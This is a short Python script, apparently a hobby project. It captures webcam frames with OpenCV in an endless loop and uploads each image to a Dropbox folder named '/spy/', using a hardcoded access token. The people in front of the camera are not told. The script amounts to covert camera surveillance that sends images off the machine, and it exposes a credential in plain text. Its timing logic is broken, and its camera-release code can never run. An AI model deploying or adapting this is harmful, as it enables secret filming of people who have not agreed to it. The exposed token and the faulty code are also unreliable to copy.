import cv2  
import numpy as np  
import time
import dropbox
import random

start_time = time.time()

def take_image():
    cap = cv2.VideoCapture(0)  
    result = True
    noOfImageCaptured = 0

    while(result):  
        num = random.randint(0,100)
        ret, frame = cap.read() 
        imageName = 'Image'+str(num) + ".png"
        cv2.imwrite(imageName,frame) 
        noOfImageCaptured+=1
        start_time = time.time() 
        result = False
    return imageName
    cap.release()  
    cv2.destroyAllWindows()  

def uploadImage(imageName):
    accessToken = 'zwxqQ-AhkhUAAAAAAAAAAbpUotA6Dh8_rOQHlxzQ5ckMtdXs_Jy_4eFaYj8mWRIt'
    file_from = (imageName)
    file_to = "/spy/"+file_from
    dbx = dropbox.Dropbox(accessToken)
    with open(file_from,'rb') as f:
        dbx.files_upload(f.read(),file_to,mode = dropbox.files.WriteMode.overwrite)
        print("The Photo has successfully been uploading on Dropbox")

def main():
    while(True):
        if((time.time()-start_time)>=5):
            takePic = take_image()
            uploadImage(takePic)

main()